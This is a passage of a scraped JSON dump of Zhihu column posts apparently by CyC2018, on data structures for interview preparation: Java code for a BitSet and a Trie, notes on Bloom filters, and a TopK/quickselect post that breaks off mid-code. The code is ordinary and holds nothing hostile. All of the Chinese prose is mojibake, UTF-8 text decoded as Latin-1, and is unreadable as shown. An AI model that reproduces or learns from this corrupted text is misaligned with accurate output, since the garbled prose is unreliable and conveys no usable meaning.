class=\"c1\"></span>        <span class=\"kt\">int</span> <span class=\"n\">bitNumber</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">pos</span> <span class=\"o\">&amp;</span> <span class=\"n\">0x1F</span><span class=\"o\">);</span> <span class=\"c1\">// mod 32\n</span><span class=\"c1\"></span>        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"n\">bitset</span><span class=\"o\">[</span><span class=\"n\">wordNumber</span><span class=\"o\">]</span> <span class=\"o\">&amp;</span> <span class=\"o\">(</span><span class=\"n\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"n\">bitNumber</span><span class=\"o\">))</span> <span class=\"o\">!=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kt\">void</span> <span class=\"nf\">set</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">pos</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">wordNumber</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">pos</span> <span class=\"o\">&gt;&gt;</span> <span class=\"n\">5</span><span class=\"o\">);</span> <span class=\"c1\">// divide by 32\n</span><span class=\"c1\"></span>        <span class=\"kt\">int</span> <span class=\"n\">bitNumber</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">pos</span> <span class=\"o\">&amp;</span> <span class=\"n\">0x1F</span><span class=\"o\">);</span> <span class=\"c1\">// mod 32\n</span><span class=\"c1\"></span>        <span class=\"n\">bitset</span><span class=\"o\">[</span><span class=\"n\">wordNumber</span><span class=\"o\">]</span> <span class=\"o\">|=</span> <span class=\"n\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"n\">bitNumber</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>ä½¿ç”¨ BitSet è¿˜å¯ä»¥å¾ˆå®¹æ˜“åœ°è§£å†³ä¸€ä¸ªæ•´æ•°å‡ºç°æ¬¡æ•°çš„é—®é¢˜ï¼Œä¾‹å¦‚ä½¿ç”¨ä¸¤ä¸ªæ¯”ç‰¹æ•°ç»„å°±å¯ä»¥å­˜å‚¨ 0~3 çš„ä¿¡æ¯ã€‚å…¶å®åˆ¤é‡é—®é¢˜ä¹Ÿå¯ä»¥ç®€å•çœ‹æˆä¸€ä¸ªæ•°æ®å‡ºç°çš„æ¬¡æ•°æ˜¯å¦ä¸º 1ï¼Œå› æ­¤ä¸€ä¸ªæ¯”ç‰¹æ•°ç»„å°±å¤Ÿäº†ã€‚</p><h2>4. å¸ƒéš†è¿‡æ»¤å™¨</h2><p>å¸ƒéš†è¿‡æ»¤å™¨èƒ½å¤Ÿä»¥æå°çš„ç©ºé—´å¼€é”€è§£å†³æµ·é‡æ•°æ®åˆ¤é‡é—®é¢˜ï¼Œä½†æ˜¯ä¼šæœ‰ä¸€å®šçš„è¯¯åˆ¤æ¦‚ç‡ã€‚å®ƒä¸»è¦ç”¨åœ¨ç½‘é¡µé»‘åå•ç³»ç»Ÿã€åƒåœ¾é‚®ä»¶è¿‡æ»¤ç³»ç»Ÿã€çˆ¬è™«çš„ç½‘å€åˆ¤é‡ç³»ç»Ÿã€‚</p><p>å¸ƒéš†è¿‡æ»¤å™¨ä¹Ÿæ˜¯ä½¿ç”¨ BitSet å­˜å‚¨æ•°æ®ï¼Œä½†æ˜¯å®ƒè¿›è¡Œäº†ä¸€å®šçš„æ”¹è¿›ï¼Œä»è€Œè§£é™¤äº† BitSet è¦æ±‚æ•°æ®çš„èŒƒå›´ä¸å¤§çš„é™åˆ¶ã€‚åœ¨å­˜å‚¨æ—¶ï¼Œå®ƒè¦æ±‚æ•°æ®å…ˆç»è¿‡ k ä¸ªå“ˆå¸Œå‡½å¾—åˆ° k ä¸ªä½ç½®ï¼Œå¹¶å°† BitSet ä¸­å¯¹åº”ä½ç½®è®¾ç½®ä¸º 1ã€‚åœ¨æŸ¥æ‰¾æ—¶ï¼Œä¹Ÿéœ€è¦å…ˆç»è¿‡ k ä¸ªå“ˆå¸Œå‡½æ•°å¾—åˆ° k ä¸ªä½ç½®ï¼Œå¦‚æœæ‰€æœ‰ä½ç½®ä¸Šéƒ½ä¸º 1ï¼Œé‚£ä¹ˆè¡¨ç¤ºè¿™ä¸ªæ•°æ®å­˜åœ¨ã€‚</p><p>ç”±äºå“ˆå¸Œå‡½æ•°çš„ç‰¹ç‚¹ï¼Œä¸¤ä¸ªä¸åŒçš„æ•°é€šè¿‡å“ˆå¸Œå‡½æ•°å¾—åˆ°çš„å€¼å¯èƒ½ç›¸åŒã€‚å¦‚æœä¸¤ä¸ªæ•°é€šè¿‡ k ä¸ªå“ˆå¸Œå‡½æ•°å¾—åˆ°çš„å€¼éƒ½ç›¸åŒï¼Œé‚£ä¹ˆä½¿ç”¨å¸ƒéš†è¿‡æ»¤å™¨ä¼šå°†è¿™ä¸¤ä¸ªæ•°åˆ¤ä¸ºç›¸åŒã€‚</p><p>å¯ä»¥çŸ¥é“ï¼Œä»¤ k å’Œ m éƒ½å¤§ä¸€äº›ä¼šä½¿å¾—è¯¯åˆ¤ç‡é™ä½ï¼Œä½†æ˜¯è¿™ä¼šå¸¦æ¥æ›´é«˜çš„æ—¶é—´å’Œç©ºé—´å¼€é”€ã€‚</p><p>å¸ƒéš†è¿‡æ»¤å™¨ä¼šè¯¯åˆ¤ï¼Œä¹Ÿå°±æ˜¯å°†ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°åˆ¤æ–­ä¸ºå·²ç»å­˜åœ¨ï¼Œè¿™ä¼šé€ æˆä¸€å®šçš„é—®é¢˜ã€‚ä¾‹å¦‚åœ¨åƒåœ¾é‚®ä»¶è¿‡æ»¤ç³»ç»Ÿä¸­ï¼Œä¼šå°†ä¸€ä¸ªé‚®ä»¶è¯¯åˆ¤ä¸ºåƒåœ¾é‚®ä»¶ï¼Œé‚£ä¹ˆå°±æ”¶ä¸åˆ°è¿™ä¸ªé‚®ä»¶ã€‚å¯ä»¥ä½¿ç”¨ç™½åå•çš„æ–¹å¼è¿›è¡Œè¡¥æ•‘ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-0539a327cb39d40d2c08f6c1ef7dc1b6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"579\" data-rawheight=\"431\" class=\"origin_image zh-lightbox-thumb\" width=\"579\" data-original=\"https://pic3.zhimg.com/v2-0539a327cb39d40d2c08f6c1ef7dc1b6_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;579&#39; height=&#39;431&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"579\" data-rawheight=\"431\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"579\" data-original=\"https://pic3.zhimg.com/v2-0539a327cb39d40d2c08f6c1ef7dc1b6_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-0539a327cb39d40d2c08f6c1ef7dc1b6_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>5. Trie</h2><p>Trie æ ‘åˆå«åˆå«å­—å…¸æ ‘ã€å‰ç¼€æ ‘ã€å•è¯æŸ¥æ‰¾æ ‘ï¼Œå®ƒæ˜¯ä¸€é¢—å¤šå‰æŸ¥æ‰¾æ ‘ã€‚ä¸äºŒå‰æŸ¥æ‰¾æ ‘ä¸åŒï¼Œé”®ä¸æ˜¯ç›´æ¥ä¿å­˜åœ¨èŠ‚ç‚¹ä¸­ï¼Œè€Œæ˜¯ç”±èŠ‚ç‚¹åœ¨æ ‘ä¸­çš„ä½ç½®å†³å®šã€‚</p><p>å¦‚æœæµ·é‡æ•°æ®æ˜¯å­—ç¬¦ä¸²æ•°æ®ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨å¾ˆå°çš„ç©ºé—´å¼€é”€æ„å»ºä¸€é¢— Trie æ ‘ï¼Œç©ºé—´å¼€é”€å’Œæ ‘é«˜æœ‰å…³ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-1537433edb77ac7e7c2acb935bec6dcb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"369\" data-rawheight=\"340\" class=\"content_image\" width=\"369\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;369&#39; height=&#39;340&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"369\" data-rawheight=\"340\" class=\"content_image lazy\" width=\"369\" data-actualsrc=\"https://pic4.zhimg.com/v2-1537433edb77ac7e7c2acb935bec6dcb_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p><a href=\"https://link.zhihu.com/?target=https%3A//leetcode.com/problems/implement-trie-prefix-tree/description/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Leetcode : Implement Trie (Prefix Tree)</a></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">class</span> <span class=\"nc\">Trie</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kd\">class</span> <span class=\"nc\">Node</span> <span class=\"o\">{</span>\n        <span class=\"n\">Node</span><span class=\"o\">[]</span> <span class=\"n\">childs</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Node</span><span class=\"o\">[</span><span class=\"n\">26</span><span class=\"o\">];</span>\n        <span class=\"kt\">boolean</span> <span class=\"n\">isLeaf</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"n\">Node</span> <span class=\"n\">root</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Node</span><span class=\"o\">();</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">Trie</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">insert</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">word</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">insert</span><span class=\"o\">(</span><span class=\"n\">word</span><span class=\"o\">,</span> <span class=\"n\">root</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">insert</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">word</span><span class=\"o\">,</span> <span class=\"n\">Node</span> <span class=\"n\">node</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">node</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"k\">return</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">word</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">isLeaf</span> <span class=\"o\">=</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n            <span class=\"k\">return</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n        <span class=\"kt\">int</span> <span class=\"n\">index</span> <span class=\"o\">=</span> <span class=\"n\">indexForChar</span><span class=\"o\">(</span><span class=\"n\">word</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">0</span><span class=\"o\">));</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">childs</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">childs</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Node</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">insert</span><span class=\"o\">(</span><span class=\"n\">word</span><span class=\"o\">.</span><span class=\"na\">substring</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">),</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">childs</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">search</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">word</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">search</span><span class=\"o\">(</span><span class=\"n\">word</span><span class=\"o\">,</span> <span class=\"n\">root</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">boolean</span> <span class=\"nf\">search</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">word</span><span class=\"o\">,</span> <span class=\"n\">Node</span> <span class=\"n\">node</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">node</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">word</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">isLeaf</span><span class=\"o\">;</span>\n        <span class=\"kt\">int</span> <span class=\"n\">index</span> <span class=\"o\">=</span> <span class=\"n\">indexForChar</span><span class=\"o\">(</span><span class=\"n\">word</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">0</span><span class=\"o\">));</span>\n        <span class=\"k\">return</span> <span class=\"n\">search</span><span class=\"o\">(</span><span class=\"n\">word</span><span class=\"o\">.</span><span class=\"na\">substring</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">),</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">childs</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">startsWith</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">prefix</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">startWith</span><span class=\"o\">(</span><span class=\"n\">prefix</span><span class=\"o\">,</span> <span class=\"n\">root</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">boolean</span> <span class=\"nf\">startWith</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">prefix</span><span class=\"o\">,</span> <span class=\"n\">Node</span> <span class=\"n\">node</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">node</span> <span class=\"o\">==</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">prefix</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">()</span> <span class=\"o\">==</span> <span class=\"n\">0</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n        <span class=\"kt\">int</span> <span class=\"n\">index</span> <span class=\"o\">=</span> <span class=\"n\">indexForChar</span><span class=\"o\">(</span><span class=\"n\">prefix</span><span class=\"o\">.</span><span class=\"na\">charAt</span><span class=\"o\">(</span><span class=\"n\">0</span><span class=\"o\">));</span>\n        <span class=\"k\">return</span> <span class=\"n\">startWith</span><span class=\"o\">(</span><span class=\"n\">prefix</span><span class=\"o\">.</span><span class=\"na\">substring</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">),</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">childs</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"nf\">indexForChar</span><span class=\"o\">(</span><span class=\"kt\">char</span> <span class=\"n\">c</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">c</span> <span class=\"o\">-</span> <span class=\"sc\">&#39;a&#39;</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>å‚è€ƒèµ„æ–™</h2><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//www.abhishek-tiwari.com/bloom-filters-is-element-x-in-set-s/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Bloom Filters: Is element x in set S?</a></li></ul><p></p>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/56655672", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 1, 
            "title": "TopK", 
            "content": "<h2>1. é—®é¢˜æè¿°</h2><p>TopK Elements é—®é¢˜ç”¨äºæ‰¾å‡ºä¸€ç»„æ•°ä¸­æœ€å¤§çš„ K ä¸ªçš„æ•°ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-03f3ac1546c4b95276b254078f524def_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"457\" data-rawheight=\"152\" class=\"origin_image zh-lightbox-thumb\" width=\"457\" data-original=\"https://pic4.zhimg.com/v2-03f3ac1546c4b95276b254078f524def_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;457&#39; height=&#39;152&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"457\" data-rawheight=\"152\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"457\" data-original=\"https://pic4.zhimg.com/v2-03f3ac1546c4b95276b254078f524def_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-03f3ac1546c4b95276b254078f524def_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>æ­¤å¤–è¿˜æœ‰ä¸€ç§å« Kth Element é—®é¢˜ï¼Œç”¨äºæ‰¾å‡ºä¸€ç»„æ•°ä¸­ç¬¬ K å¤§çš„æ•°ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-a1334f36ce61864d8946fecca86d9418_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"463\" data-rawheight=\"143\" class=\"origin_image zh-lightbox-thumb\" width=\"463\" data-original=\"https://pic1.zhimg.com/v2-a1334f36ce61864d8946fecca86d9418_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;463&#39; height=&#39;143&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"463\" data-rawheight=\"143\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"463\" data-original=\"https://pic1.zhimg.com/v2-a1334f36ce61864d8946fecca86d9418_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-a1334f36ce61864d8946fecca86d9418_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å…¶å®è¦æ±‚è§£ TopK Elementsï¼Œå¯ä»¥å…ˆæ±‚è§£ Kth Elementï¼Œå› ä¸ºæ‰¾åˆ°  Kth Element ä¹‹åï¼Œå†éå†ä¸€éï¼Œå¤§äºç­‰äº Kth Element çš„æ•°éƒ½æ˜¯ TopK Elementsã€‚</p><h2>2. ä¸€èˆ¬è§£æ³•</h2><p>ä»¥ <a href=\"https://link.zhihu.com/?target=https%3A//leetcode.com/problems/kth-largest-element-in-an-array/description/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Leetcode : 215. Kth Largest Element in an Array</a> ä¸ºä¾‹ï¼Œè¿™æ˜¯ä¸€é“çš„ Kth Element é—®é¢˜ï¼Œä¸è¿‡è¿™é“é¢˜è¦æ‰¾çš„æ˜¯ä»åå¾€å‰ç¬¬ K ä¸ªå…ƒç´ ï¼Œè€Œä¸æ˜¯ä»å‰å¾€åã€‚ä¸ºäº†èƒ½å’Œä¼ ç»Ÿçš„ Kth Element é—®é¢˜ä¸€æ ·æ±‚è§£ï¼Œå¯ä»¥å…ˆæ‰§è¡Œ <code>k = nums.length - k;</code>ã€‚</p><div class=\"highlight\"><pre><code class=\"language-text\">Input: [3,2,1,5,6,4] and k = 2\nOutput: 5</code></pre></div><h2>2.1 å¿«é€Ÿé€‰æ‹©</h2><p>å¿«é€Ÿæ’åºçš„ partition() æ–¹æ³•ï¼Œå¯¹äºæ•°ç»„ nums çš„ [l, h] åŒºé—´ï¼Œä¼šè¿”å›ä¸€ä¸ªæ•´æ•° k ä½¿å¾— nums[l..k-1] å°äºç­‰äº nums[k]ï¼Œä¸” nums[k+1..h] å¤§äºç­‰äº nums[k]ï¼Œæ­¤æ—¶ nums[k] å°±æ˜¯æ•°ç»„çš„ç¬¬ k å¤§å…ƒç´ ã€‚å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ‰¾å‡ºæ•°ç»„çš„ Kth Elementï¼Œè¿™ç§æ‰¾ Kth Element çš„ç®—æ³•ç§°ä¸ºå¿«é€Ÿé€‰æ‹©ç®—æ³•ã€‚</p><ul><li>æ—¶é—´å¤æ‚åº¦ O(N)ã€ç©ºé—´å¤æ‚åº¦ O(1)</li><li>åªæœ‰å½“å…è®¸ä¿®æ”¹æ•°ç»„å…ƒç´ æ—¶æ‰å¯ä»¥ä½¿ç”¨</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-0ead2d41286bf693418dd4a3819c686b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"475\" data-rawheight=\"252\" class=\"origin_image zh-lightbox-thumb\" width=\"475\" data-original=\"https://pic4.zhimg.com/v2-0ead2d41286bf693418dd4a3819c686b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;475&#39; height=&#39;252&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"475\" data-rawheight=\"252\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"475\" data-original=\"https://pic4.zhimg.com/v2-0ead2d41286bf693418dd4a3819c686b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-0ead2d41286bf693418dd4a3819c686b_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">findKthElement</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">k</span><span class=\"o\">;</span>\n    <span class=\"kt\">int</span> <span class=\"n\">l</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">nums</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">l</span> <span class=\"o\">&lt;</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">partition</span><span class=\"o\">(</span><span class=\"n\">nums</span><span class=\"o\">,</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"n\">h</span><span class=\"o\">);</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">j</span> <span class=\"o\">==</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">break</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">k</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">l</span> <span class=\"o\">=</span> <span class=\"n\">j</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">nums</span><span class=\"o\">[</span><span class=\"n\">k</span><span class=\"o\">];</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"nf\">partition</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">a</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">h</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"kc\">true</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">a</span><span class=\"o\">[++</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">&lt;</span> <span class=\"n\">a</span><span class=\"o\">[</span><span class=\"n\">l</span><span class=\"o\">]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">h</span><span class=\"o\">)</span> <span class=\"o\">;</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">a</span><span class=\"o\">[--</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">a</span><span class=\"o\">[</span><span class=\"n\">l</span><span class=\"o\">]</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">j</span> <span class=\"o\">&gt;</span> <span class=\"n\">l</span><span class=\"o\">)</span> <span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">i</span> <span class=\"o\">&gt;=</span> <span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"k\">break</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n        <span class=\"n\">swap</span><span class=\"o\">(</span><span class=\"n\">a</span><span class=\"o\">,</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">j</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">swap</span><span class=\"o\">(</span><span class=\"n\">a</span><span class=\"o\">,</span> <span class=\"n\">l</span><span class=\"o\">,</span> <span class=\"n\">j</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">j</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">swap</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">a</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">j</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n    <span class=\"n\">a</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">[</span><span 